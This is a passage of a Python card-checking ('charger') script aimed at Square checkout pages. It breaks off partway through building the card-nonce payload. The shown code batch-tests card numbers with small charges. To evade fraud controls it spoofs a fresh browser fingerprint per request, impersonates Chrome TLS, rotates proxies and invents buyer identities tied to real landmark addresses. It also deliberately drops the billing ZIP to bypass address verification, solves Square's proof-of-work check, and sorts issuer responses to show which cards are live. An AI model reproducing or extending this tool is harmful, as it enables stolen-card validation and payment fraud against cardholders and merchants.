"""
checker.py — Square Deluxe Charger API v4.0 (20x upgraded)

v4.0 UPGRADE — complete fingerprint overhaul:
  • Uses the whophitter's fingerprints.py module — 11 OS profiles (macOS, iOS,
    Android, Linux, ChromeOS — NO Windows), 32 Chrome versions (124-155,
    latest-weighted), 40+ GPUs, 20+ screen resolutions, millions of unique
    combinations.
  • EVERY request gets a COMPLETELY NEW device fingerprint:
    - New User-Agent (Chrome/CriOS on random OS)
    - New sec-ch-ua / sec-ch-ua-mobile / sec-ch-ua-platform client hints
    - New device_info dict for BasisTheory (screen, hardware, WebGL, etc.)
    - New Accept-Language header
    - New timezone + JS UTC offset
    - New Square fingerprint.js v1/v1s/v2 hashes (derived from device_info)
  • curl_cffi Chrome TLS impersonation matches the fingerprint's Chrome version
  • AVS bypass: billing_postal_code omitted → AVS_NOT_CHECKED always
  • 3-attempt retry with fresh fingerprint per attempt
  • 429 rate-limit handling: try all proxies, then pause 60s

Public API (unchanged):
  check_one_sync(card_str, site_url, proxy=None, amount_cents=100, email=None) -> dict
  check_multi_sync(cards, site_url, proxy=None, amount_cents=100, max_workers=15) -> list
"""

import os
import re
import json
import time
import uuid
import random
import string
import hashlib
import asyncio
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime
from urllib.parse import quote as _url_quote

# v4.0 — whophitter fingerprint module (11 OS profiles, millions of unique combos)
try:
    from fingerprints import random_fingerprint
    HAS_FINGERPRINTS = True
except Exception as _fp_err:
    print(f"[checker] fingerprints.py unavailable: {_fp_err}")
    HAS_FINGERPRINTS = False
    random_fingerprint = None

# curl_cffi provides real-browser TLS handshakes
try:
    from curl_cffi import requests as cffi
    HAS_CFFI = True
except Exception as _cffi_err:
    print(f"[checker] curl_cffi unavailable: {_cffi_err} — Square will 403")
    cffi = None
    HAS_CFFI = False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CLIENT_ID  = "sq0idp-w46nJ_NCNDMSOywaCY0mwA"
SDK_VERSION = "1.83.14"

VERSION = "4.0.0"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  TIMESTAMP HELPER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _iso_now() -> str:
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.") + \
           f"{datetime.utcnow().microsecond // 1000:03d}Z"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UNIVERSAL PROXY PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_VALID_SCHEMES = {"http", "https", "socks4", "socks4a", "socks5", "socks5h"}


def _parse_proxy_universal(raw):
    if not raw or not str(raw).strip():
        return None
    s = str(raw).strip()
    if '://' in s:
        scheme_part, rest = s.split('://', 1)
        scheme = scheme_part.lower().strip()
        if scheme not in _VALID_SCHEMES:
            scheme = 'http'
            rest = s
        if '@' in rest:
            creds, hostport = rest.rsplit('@', 1)
            if ':' in creds:
                user, pwd = creds.split(':', 1)
                creds = f"{_url_quote(user, safe='')}:{_url_quote(pwd, safe='')}"
            else:
                creds = _url_quote(creds, safe='')
            rest = f"{creds}@{hostport}"
        return f"{scheme}://{rest}"
    parts = s.split(':')
    if len(parts) >= 4 and '@' not in parts[0] and '@' not in parts[1] and '@' not in parts[2]:
        host = parts[0]; port = parts[1]; user = parts[2]; pwd = ':'.join(parts[3:])
        if not host or not port.isdigit():
            return None
        return f"http://{_url_quote(user, safe='')}:{_url_quote(pwd, safe='')}@{host}:{port}"
    if '@' in s:
        if s.count('@') != 1:
            return None
        creds, hostport = s.split('@', 1)
        if ':' not in hostport:
            return None
        if ':' in creds:
            user, pwd = creds.split(':', 1)
            creds = f"{_url_quote(user, safe='')}:{_url_quote(pwd, safe='')}"
        else:
            creds = _url_quote(creds, safe='')
        return f"http://{creds}@{hostport}"
    if len(parts) == 2:
        host, port = parts
        if not host or not port.isdigit():
            return None
        return f"http://{host}:{port}"
    if len(parts) == 3:
        host, port, user = parts
        if not host or not port.isdigit():
            return None
        return f"http://{_url_quote(user, safe='')}@{host}:{port}"
    return None


def _is_test_mode(proxy_str) -> bool:
    if proxy_str is None:
        return True
    s = str(proxy_str).strip().lower()
    return s in ("", "test", "none", "off", "direct", "no-proxy", "false", "0")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RANDOM IDENTITY + REAL ADDRESSES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_FIRST = ["james","john","robert","michael","william","david","richard","joseph",
          "thomas","charles","emma","olivia","ava","isabella","sophia","mia",
          "charlotte","amelia","harper","evelyn"]
_LAST = ["smith","johnson","williams","brown","jones","garcia","miller","davis",
         "wilson","taylor","anderson","thomas","jackson","white","harris","martin"]
_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]

_REAL_US_ADDRESSES = [
    ("350 5th Ave", "New York", "NY", "10118"),
    ("1 World Trade Center", "New York", "NY", "10007"),
    ("11 Wall St", "New York", "NY", "10005"),
    ("30 Rockefeller Plaza", "New York", "NY", "10112"),
    ("3500 W Olive Ave", "Burbank", "CA", "91505"),
    ("1 Infinite Loop", "Cupertino", "CA", "95014"),
    ("1600 Amphitheatre Pkwy", "Mountain View", "CA", "94043"),
    ("1 Hacker Way", "Menlo Park", "CA", "94025"),
    ("405 Howard St", "San Francisco", "CA", "94105"),
    ("233 S Wacker Dr", "Chicago", "IL", "60606"),
    ("875 N Michigan Ave", "Chicago", "IL", "60611"),
    ("2800 Post Oak Blvd", "Houston", "TX", "77056"),
    ("3000 Oak Lawn Ave", "Dallas", "TX", "75219"),
    ("1000 5th St", "Miami Beach", "FL", "33139"),
    ("400 Broad St", "Seattle", "WA", "98109"),
    ("100 Federal St", "Boston", "MA", "02110"),
    ("265 Peachtree St NE", "Atlanta", "GA", "30303"),
    ("1701 Bryant St", "Denver", "CO", "80202"),
    ("2331 N 44th St", "Phoenix", "AZ", "85008"),
    ("3799 Las Vegas Blvd S", "Las Vegas", "NV", "89109"),
    ("1601 Market St", "Philadelphia", "PA", "19103"),
    ("1600 Pennsylvania Ave NW", "Washington", "DC", "20500"),
]


def _rand_identity() -> Tuple[str, str, str, str]:
    first = random.choice(_FIRST).capitalize()
    last = random.choice(_LAST).capitalize()
    tag = "".join(random.choices(string.digits, k=random.randint(2, 5)))
    email = f"{first.lower()}{last.lower()}{tag}@{random.choice(_DOMAINS)}"
    area = random.randint(200, 999)
    exch = random.randint(200, 999)
    num = random.randint(1000, 9999)
    phone = f"{area}{exch}{num}"
    return first, last, email, phone


def _rand_real_address() -> Tuple[str, str, str, str]:
    return random.choice(_REAL_US_ADDRESSES)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  v4.0 FINGERPRINT GENERATOR — uses whophitter's fingerprints.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _rand_fp_v4():
    """v4.0 — Generate a COMPLETELY NEW device fingerprint using the whophitter
    fingerprints.py module.

    Returns a dict with everything the 12-step flow needs:
      ua, sec_ch_ua, sec_ch_ua_mobile, sec_ch_ua_platform, accept_language,
      device_info (full BT dict), chrome_version, os_name, screen_size,
      timezone, tz_offset_minutes, is_mobile, is_ios,
      v1_str, v1s_str, v2_str, h1, h1s, h2, vf1, vf1s, vf2
    """
    if not HAS_FINGERPRINTS:
        # Fallback to old method if fingerprints.py not available
        return _rand_fp_legacy()

    fp = random_fingerprint()

    # Generate Square fingerprint.js hashes from the device_info
    def rh():
        return "".join(random.choices("0123456789abcdef", k=32))

    h1, h1s, h2 = rh(), rh(), rh()

    # Build Square fingerprint.js v1/v1s/v2 component strings from the device_info
    di = fp["device_info"]
    ua = fp["user_agent"]
    lang = fp["accept_language"].split(",")[0]
    tz_off = fp["tz_offset_minutes"]
    sw, sh = fp["screen_size"]
    hw = di.get("hardwareConcurrency", 8)
    mem = di.get("deviceMemoryGb", 8)
    tz_name = fp["timezone"]

    # v1 (with UA)
    v1_str = json.dumps({
        "user_agent": ua,
        "language": lang,
        "resolution": [sw, sh],
        "available_resolution": [sw, sh - random.choice([40, 56, 72])],
        "timezone_offset": tz_off,
        "navigator_platform": di.get("platform", "MacIntel"),
        "regular_plugins": di.get("plugins", []),
        "adblock": False,
        "touch_support": [di.get("maxTouchPoints", 0), di.get("maxTouchPoints", 0) > 0, True],
        "js_fonts": ["Arial", "Calibri", "Cambria", "Consolas", "Courier New", "Georgia",
                     "Helvetica", "Impact", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana"],
    }, separators=(',', ':'))

    # v1s (without UA)
    v1s_str = json.dumps({
        "language": lang,
        "resolution": [sw, sh],
        "available_resolution": [sw, sh - random.choice([40, 56, 72])],
        "timezone_offset": tz_off,
        "navigator_platform": di.get("platform", "MacIntel"),
        "regular_plugins": di.get("plugins", []),
        "adblock": False,
        "touch_support": [di.get("maxTouchPoints", 0), di.get("maxTouchPoints", 0) > 0, True],
        "js_fonts": ["Arial", "Calibri", "Cambria", "Consolas", "Courier New", "Georgia",
                     "Helvetica", "Impact", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana"],
    }, separators=(',', ':'))

    # v2 (richer fingerprint)
    v2_str = json.dumps({
        "fonts": ["Arial", "Calibri", "Cambria", "Consolas", "Courier New", "Georgia",
                  "Helvetica", "Impact", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana"],
        "font_preferences": {"default": 120, "apple": 120, "serif": 120, "sans": 115, "mono": 97, "min": 7, "system": 118},
        "audio": round(random.uniform(124.0, 124.1), 6),
        "screen_frame": [0, 0, random.choice([40, 50]), 0],
        "languages": [[lang]],
        "device_memory": mem,
        "screen_resolution": [sh, sw],
        "hardware_concurrency": hw,
        "timezone": tz_name,
        "indexed_db": True,
        "open_database": False,
        "platform": di.get("platform", "MacIntel"),
        "plugins": [{"name": "PDF Viewer", "description": "Portable Document Format",
                      "mimeTypes": [{"type": "application/pdf", "suffixes": "pdf"}]}],
        "canvas": {"winding": True},
        "touch_support": {"maxTouchPoints": di.get("maxTouchPoints", 0),
                          "touchEvent": di.get("maxTouchPoints", 0) > 0,
                          "touchStart": di.get("maxTouchPoints", 0) > 0},
        "vendor_flavors": ["chrome"],
        "color_gamut": "srgb",
        "forced_colors": False,
        "monochrome": 0,
        "contrast": 0,
        "reduced_motion": False,
        "hdr": False,
    }, separators=(',', ':'))

    # Verification payloads (components + fingerprint hash)
    vf1 = json.dumps({"components": json.loads(v1_str), "fingerprint": h1}, separators=(',', ':'))
    vf1s = json.dumps({"components": json.loads(v1s_str), "fingerprint": h1s}, separators=(',', ':'))
    vf2 = json.dumps({"components": json.loads(v2_str), "fingerprint": h2}, separators=(',', ':'))

    return {
        "ua": ua,
        "sec_ch_ua": fp["sec_ch_ua"],
        "sec_ch_ua_mobile": fp["sec_ch_ua_mobile"],
        "sec_ch_ua_platform": fp["sec_ch_ua_platform"],
        "accept_language": fp["accept_language"],
        "device_info": di,
        "chrome_version": fp["chrome_version"],
        "os_name": fp["os_name"],
        "screen_size": fp["screen_size"],
        "timezone": tz_name,
        "tz_offset_minutes": tz_off,
        "is_mobile": fp["is_mobile"],
        "is_ios": fp["is_ios"],
        "v1_str": v1_str,
        "v1s_str": v1s_str,
        "v2_str": v2_str,
        "h1": h1, "h1s": h1s, "h2": h2,
        "vf1": vf1, "vf1s": vf1s, "vf2": vf2,
    }


def _rand_fp_legacy():
    """Fallback when fingerprints.py is not available — uses old template method."""
    ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ch = '"Not;A=Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"'
    def rh():
        return "".join(random.choices("0123456789abcdef", k=32))
    h1, h1s, h2 = rh(), rh(), rh()
    v1_str = '{"user_agent":"' + ua + '","language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"MacIntel","regular_plugins":[],"adblock":false,"touch_support":[0,false,true],"js_fonts":[]}'
    v1s_str = '{"language":"en-US","resolution":[1920,1080],"available_resolution":[1920,1040],"timezone_offset":-300,"navigator_platform":"MacIntel","regular_plugins":[],"adblock":false,"touch_support":[0,false,true],"js_fonts":[]}'
    v2_str = '{"fonts":[],"font_preferences":{},"audio":124.0,"screen_frame":[0,0,50,0],"languages":[["en-US"]],"device_memory":8,"screen_resolution":[1080,1920],"hardware_concurrency":8,"timezone":"America/New_York","indexed_db":true,"open_database":false,"platform":"MacIntel","plugins":[],"canvas":{"winding":true},"touch_support":{"maxTouchPoints":0,"touchEvent":false,"touchStart":false},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false}'
    vf1 = '{"components":' + v1_str + f',"fingerprint":"{h1}"' + '}'
    vf1s = '{"components":' + v1s_str + f',"fingerprint":"{h1s}"' + '}'
    vf2 = '{"components":' + v2_str + f',"fingerprint":"{h2}"' + '}'
    return {
        "ua": ua, "sec_ch_ua": ch, "sec_ch_ua_mobile": "?0", "sec_ch_ua_platform": '"macOS"',
        "accept_language": "en-US,en;q=0.9", "device_info": {}, "chrome_version": 131,
        "os_name": "macOS", "screen_size": (1920, 1080), "timezone": "America/New_York",
        "tz_offset_minutes": -300, "is_mobile": False, "is_ios": False,
        "v1_str": v1_str, "v1s_str": v1s_str, "v2_str": v2_str,
        "h1": h1, "h1s": h1s, "h2": h2, "vf1": vf1, "vf1s": vf1s, "vf2": vf2,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HEADER BUILDERS — use fingerprint's real UA/sec-ch-ua/platform
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _h_checkout_api(fp: dict, merchant_id: str = "", checkout_id: str = "") -> dict:
    referer = (f"https://checkout.square.site/merchant/{merchant_id}/checkout/{checkout_id}"
               if merchant_id and checkout_id else "https://checkout.square.site/")
    return {
        "accept-language": fp["accept_language"],
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "sec-ch-ua": fp["sec_ch_ua"],
        "sec-ch-ua-mobile": fp["sec_ch_ua_mobile"],
        "sec-ch-ua-platform": fp["sec_ch_ua_platform"],
        "user-agent": fp["ua"],
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://checkout.square.site",
        "referer": referer,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }


def _h_pci(fp: dict, storage_access: str = "none") -> dict:
    return {
        "accept-language": fp["accept_language"],
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "sec-ch-ua": fp["sec_ch_ua"],
        "sec-ch-ua-mobile": fp["sec_ch_ua_mobile"],
        "sec-ch-ua-platform": fp["sec_ch_ua_platform"],
        "user-agent": fp["ua"],
        "accept": "application/json",
        "content-type": "application/json; charset=utf-8",
        "origin": "https://web.squarecdn.com",
        "referer": "https://web.squarecdn.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sec-fetch-storage-access": storage_access,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  SESSION BUILDER — curl_cffi with Chrome impersonation matching fingerprint
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Map Chrome version → curl_cffi impersonation target
_CHROME_TLS_BUCKETS = [
    (127, "chrome124"), (131, "chrome131"), (133, "chrome133a"),
    (136, "chrome136"), (142, "chrome142"), (145, "chrome145"),
    (10**6, "chrome150"),
]
_CHROME_TLS_FALLBACK = ["chrome150", "chrome145", "chrome142", "chrome136",
                        "chrome133a", "chrome131", "chrome124"]


def _impersonate_target(chrome_version: int) -> str:
    for maxv, target in _CHROME_TLS_BUCKETS:
        if int(chrome_version or 150) <= maxv:
            return target
    return "chrome150"


def _build_session(proxy_url: Optional[str] = None, chrome_version: int = 150):
    if not HAS_CFFI:
        raise RuntimeError("curl_cffi is required")
    target = _impersonate_target(chrome_version)
    kwargs = {"impersonate": target, "verify": False}
    if proxy_url:
        kwargs["proxies"] = {"http": proxy_url, "https": proxy_url}
    return cffi.AsyncSession(**kwargs)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  URL PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_SQUARE_URL_RE = re.compile(r"merchant/([A-Z0-9]+)/checkout/([A-Z0-9]+)", re.IGNORECASE)


def _parse_square_url(url: str) -> Tuple[str, str]:
    m = _SQUARE_URL_RE.search(url or "")
    if not m:
        raise ValueError(f"Could not parse Square URL — expected 'merchant/<ID>/checkout/<ID>' in: {url}")
    return m.group(1).upper(), m.group(2).upper()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  RESPONSE PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RESPONSE_MAP = {
    "APPROVED": "APPROVED", "AUTHORIZED": "APPROVED", "CAPTURED": "APPROVED",
    "SUCCESS": "APPROVED", "PAYMENT_SUCCESSFUL": "APPROVED",
    "GENERIC_DECLINE": "DECLINED", "INVALID_SECURITY_CODE": "CVV_MISMATCH",
    "CVV_FAILURE": "CVV_MISMATCH", "CVV_MISMATCH": "CVV_MISMATCH",
    "INCORRECT_CVV": "CVV_MISMATCH", "INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "INSUFFICIENT_FUNDS_FAILURE": "INSUFFICIENT_FUNDS",
    "GIFT_CARD_AVAILABLE_AMOUNT": "INSUFFICIENT_FUNDS",
    "DECLINE": "DECLINED", "DECLINED": "DECLINED", "CARD_DECLINED": "DECLINED",
    "TRANSACTION_LIMIT": "DECLINED", "TRANSACTION_LIMIT_FAILED": "DECLINED",
    "CARD_VELOCITY": "DECLINED", "CARD_VELOCITY_EXCEEDED": "DECLINED",
    "PAYMENT_LIMIT_EXCEEDED": "DECLINED",
    "EXPIRED_CARD": "EXPIRED_CARD", "EXPIRED_CARD_FAILURE": "EXPIRED_CARD",
    "EXPIRATION_FAILURE": "EXPIRED_CARD",
    "INVALID_PAN": "INVALID_CARD", "PAN_FAILURE": "INVALID_CARD",
    "INVALID_CARD": "INVALID_CARD", "INVALID_CARD_DATA": "INVALID_CARD",
    "CARD_NOT_SUPPORTED": "DECLINED", "INVALID_REGION": "DECLINED",
    "BAD_REQUEST": "ERROR", "INVALID_REQUEST_ERROR": "ERROR",
    "INVALID_VALUE": "ERROR", "RATE_LIMITED": "ERROR",
    "3DS_REQUIRED": "3DS_REQUIRED", "AUTHENTICATION_REQUIRED": "3DS_REQUIRED",
    "CARD_DECLINED_VERIFICATION_REQUIRED": "3DS_REQUIRED",
    "VERIFICATION_REQUIRED": "3DS_REQUIRED",
    "ADDRESS_VERIFICATION_FAILURE": "DECLINED",
    "CARD_DECLINED_CALL_ISSUER": "DECLINED", "CARD_DECLINED_EXPIRED_CARD": "DECLINED",
    "CARD_DECLINED_INVALID_CVV": "CVV_MISMATCH", "CARD_DECLINED_INVALID_EXPIRATION": "EXPIRED_CARD",
    "CARD_DECLINED_INVALID_PIN": "DECLINED", "CARD_DECLINED_PIN_TRIES_EXCEEDED": "DECLINED",
    "CARD_DECLINED_PROCESSING_ERROR": "DECLINED",
    "CARD_DECLINED_NO_CHECKING_ACCOUNT": "DECLINED", "CARD_DECLINED_NO_SAVINGS_ACCOUNT": "DECLINED",
}


def parse_response(data: Dict) -> Tuple[str, str]:
    if not data:
        return "UNKNOWN", "Empty response"
    errors = data.get("errors", [])
    if errors:
        error = errors[0]
        code = error.get("code", "UNKNOWN")
        detail = error.get("detail", error.get("message", "Unknown error"))
        if "GENERIC_DECLINE" in code or "DECLINE" in code.upper():
            return "DECLINED", detail
        if "CVV" in code or "SECURITY_CODE" in code:
            return "CVV_MISMATCH", detail
        if "INSUFFICIENT" in code:
            return "INSUFFICIENT_FUNDS", detail
        if "EXPIRED" in code or "EXPIRATION" in code:
            return "EXPIRED_CARD", detail
        if "PAN_FAILURE" in code or "INVALID_PAN" in code or "INVALID_CARD" in code:
            return "INVALID_CARD", detail
        if "TRANSACTION_LIMIT" in code or "CARD_VELOCITY" in code:
            return "DECLINED", detail
        if "3DS" in code or "AUTHENTICATION" in code or "VERIFICATION_REQUIRED" in code:
            return "3DS_REQUIRED", detail
        if "BAD_REQUEST" in code or "INVALID_REQUEST" in code:
            return "ERROR", detail
        return RESPONSE_MAP.get(code, code), detail
    payment = data.get("payment", {})
    if payment.get("id"):
        status = payment.get("status", "").upper()
        if status in ["COMPLETED", "APPROVED", "CAPTURED", "AUTHORIZED"]:
            return "APPROVED", f"Payment ID: {payment['id']}"
        elif status == "FAILED":
            cd = payment.get("card_details", {})
            errs = cd.get("errors", [])
            if errs:
                return "DECLINED", errs[0].get("detail", "Payment failed")
            return "DECLINED", f"Payment failed with status: {status}"
        else:
            return "UNKNOWN", f"Payment status: {status}"
    if data.get("status") == "SUCCESS":
        return "APPROVED", "Payment successful"
    if data.get("message"):
        msg = data.get("message", "")
        if "could not be found" in msg or "not found" in msg:
            return "SESSION_EXPIRED", "Checkout session expired or invalid"
        if "declined" in msg.lower():
            return "DECLINED", msg
    return "UNKNOWN", str(data)[:200]


def _extract_result(result) -> Tuple[str, str]:
    if result is None:
        return "UNKNOWN", "No response"
    if result.get("error"):
        err_str = result.get("error", "Unknown error")
        for code, mapped in [("PAN_FAILURE","INVALID_CARD"),("INVALID_PAN","INVALID_CARD"),
            ("EXPIRED_CARD","EXPIRED_CARD"),("EXPIRATION_FAILURE","EXPIRED_CARD"),
            ("INSUFFICIENT_FUNDS","INSUFFICIENT_FUNDS"),("CVV_FAILURE","CVV_MISMATCH"),
            ("GENERIC_DECLINE","DECLINED"),("TRANSACTION_LIMIT","DECLINED"),
            ("CARD_VELOCITY","DECLINED"),("CARD_DECLINED_VERIFICATION_REQUIRED","3DS_REQUIRED"),
            ("BAD_REQUEST","ERROR"),("RATE_LIMITED","ERROR")]:
            if code in err_str:
                return mapped, err_str[:200]
        return "ERROR", err_str[:200]
    data = result.get("data", {})
    return parse_response(data)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CARD HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _fix_year(yy: str) -> str:
    yy = yy.strip()
    if len(yy) == 2:
        return f"20{yy}"
    return yy


def _parse_card(raw: str) -> Optional[Tuple[str, str, str, str]]:
    if not raw:
        return None
    parts = [p.strip() for p in str(raw).strip().split("|")]
    if len(parts) != 4:
        return None
    cc, mes, ano, cvv = parts
    if not cc or not mes or not ano or not cvv:
        return None
    return cc, mes, _fix_year(ano), cvv


def _card_brand(cc: str) -> str:
    num = (cc or "").replace(" ", "")
    if num.startswith("4"):
        return "VISA"
    if num[:2] in ("51", "52", "53", "54", "55") or 2221 <= int(num[:4] or "0") <= 2720:
        return "MASTERCARD"
    if num.startswith(("34", "37")):
        return "AMEX"
    if num.startswith("6"):
        return "DISCOVER"
    return "UNKNOWN"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN 12-STEP FLOW — v4.0 with whophitter fingerprints
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _run_with_client(
    checkout_sess, pci_sess,
    merchant_id: str, checkout_id: str,
    fp: dict,  # v4.0 — full fingerprint dict
    first_name: str, last_name: str, email: str, phone: str,
    cc: str, mes: str, ano: str, cvv: str,
    address_line1: str, address_city: str, address_state: str, address_zip: str,
    amount: int = 100,
) -> Optional[Dict[str, Any]]:
    """The full 12-step Square checkout flow using whophitter fingerprints."""

    ua = fp["ua"]
    H = lambda: _h_checkout_api(fp, merchant_id, checkout_id)
    Hpci = lambda sa="none": _h_pci(fp, storage_access=sa)

    # Step 1: Get Order
    s1_url = f"https://checkout.square.site/api/merchant/{merchant_id}/checkout/{checkout_id}"
    s1_body = {"buyerControlledPrice": {"amount": amount, "currency": "USD", "precision": 2},
               "subscriptionPlanId": None, "oneTimePayment": True, "itemCustomizations": []}
    try:
        r1 = await checkout_sess.post(s1_url, headers=H(), json=s1_body, timeout=30)
        if r1.status_code >= 400:
            return {"error": f"Order fetch HTTP {r1.status_code}: {r1.text[:200]}", "step": 1}
        order_data = r1.json()
    except Exception as e:
        return {"error": f"Failed to fetch order: {str(e)[:200]}", "step": 1}
    order_id = (order_data.get("order") or {}).get("id")
    location_id = (order_data.get("order") or {}).get("location_id", "")
    if not order_id:
        return {"error": "No order ID", "step": 1}

    # Step 2: Update Order
    try:
        await checkout_sess.patch(
            f"https://checkout.square.site/api/merchant/{merchant_id}/location/{location_id}/order/{order_id}",
            headers=H(), json=s1_body, timeout=30)
    except Exception:
        pass

    # Step 3: Visited
    try:
        await checkout_sess.patch(
            f"https://checkout.square.site/api/merchant/{merchant_id}/location/{location_id}/order/{order_id}/visited",
            headers=H(), timeout=30)
    except Exception:
        pass

    # Step 4: Customer
    cust_body = {
        "given_name": first_name, "family_name": last_name, "email_address": email,
        "phone_number": {"national_number": phone, "region_code": "US", "country_code": "1", "formatted": ""},
        "shipping_address": {
            "first_name": first_name, "last_name": last_name, "full_name": f"{first_name} {last_name}",
            "phone": {"national_number": phone, "region_code": "US", "country_code": "1", "formatted": ""},
            "address_line_1": address_line1, "address_line_2": None,
            "locality": address_city, "administrative_district_level_1": address_state,
            "postal_code": address_zip, "country": "US", "label": "Shipping",
        },
    }
    try:
        await checkout_sess.patch(
            f"https://checkout.square.site/api/soc-platform/merchant/{merchant_id}/location/{location_id}/order/{order_id}/customer",
            headers=H(), json=cust_body, timeout=30)
    except Exception:
        pass

    await asyncio.sleep(random.uniform(0.5, 1.5))

    # Step 5: Hydrate (PCI session)
    try:
        r_hyd = await pci_sess.get("https://pci-connect.squareup.com/payments/hydrate",
            headers={**Hpci(sa="active"), "accept": "*/*"},
            params={"applicationId": CLIENT_ID, "hostname": "checkout.square.site",
                    "locationId": location_id, "version": SDK_VERSION}, timeout=30)
        if r_hyd.status_code >= 400:
            return {"error": f"Hydrate HTTP {r_hyd.status_code}: {r_hyd.text[:200]}", "step": 5}
        hyd_data = r_hyd.json()
    except Exception as e:
        return {"error": f"Hydrate failed: {str(e)[:200]}", "step": 5}
    session_id = hyd_data.get("sessionId", "")
    instance_id = hyd_data.get("instanceId", str(uuid.uuid4()))
    pow_prefix = hyd_data.get("powPrefix", "000")
    if not session_id:
        return {"error": "No session ID from hydrate", "step": 5}

    # Step 6: Cookies
    avt_val = hyd_data.get("avt", "")
    cfbm_val = ""
    try:
        raw_sc = r_hyd.headers.get("set-cookie", "") or ""
    except Exception:
        raw_sc = ""
    if "__cf_bm=" in raw_sc:
        cfbm_val = raw_sc.split("__cf_bm=", 1)[1].split(";")[0].strip()
    pci_ck = {}
    if avt_val or cfbm_val:
        cookie_parts = []
        if avt_val: cookie_parts.append(f"_savt={avt_val}")
        if cfbm_val: cookie_parts.append(f"__cf_bm={cfbm_val}")
        pci_ck = {"cookie": "; ".join(cookie_parts)}
        if avt_val: pci_ck["x-allow-cookies"] = f"_savt={avt_val}"

    await asyncio.sleep(random.uniform(0.3, 1.0))

    # Step 7: Product Information
    try:
        await pci_sess.post("https://pci-connect.squareup.com/v2/tokenization/product-information",
            headers={**Hpci(), **pci_ck},
            json={"bin": cc[:11], "client_id": CLIENT_ID, "session_id": session_id}, timeout=30)
    except Exception:
        pass

    await asyncio.sleep(random.uniform(0.3, 1.0))

    # Step 8: 3DS Method
    pre_three_ds_txn_id = None
    try:
        r17 = await pci_sess.post("https://pci-connect.squareup.com/v2/analytics/three-ds-method",
            headers={**Hpci(), **pci_ck},
            json={"bin": cc[:6], "client_id": CLIENT_ID,
                  "universal_token": {"token": location_id, "type": "UNIT"}}, timeout=30)
        if r17.status_code == 200:
            try: pre_three_ds_txn_id = r17.json().get("three_ds_server_transaction_id")
            except: pass
    except: pass

    # Step 9: PoW
    pow_counter = None
    if pow_prefix:
        suffix = f"{CLIENT_ID},{location_id},{instance_id}"
        for i in range(1, 500_000):
            if hashlib.sha256(f"{session_id}:{i}:{suffix}".encode()).hexdigest().startswith(pow_prefix):
                pow_counter = i; break

    await asyncio.sleep(random.uniform(0.3, 1.0))

    # Step 10: Card Nonce — v4.0 uses fingerprint's v1/v1s/v2 + device_info
    sw, sh = fp["screen_size"]
    nonce_payload = {
        "analytics": {
            "fingerprints": [
                {"components": fp["v1_str"], "fingerprint": fp["h1"], "version": "fingerprint-v1"},
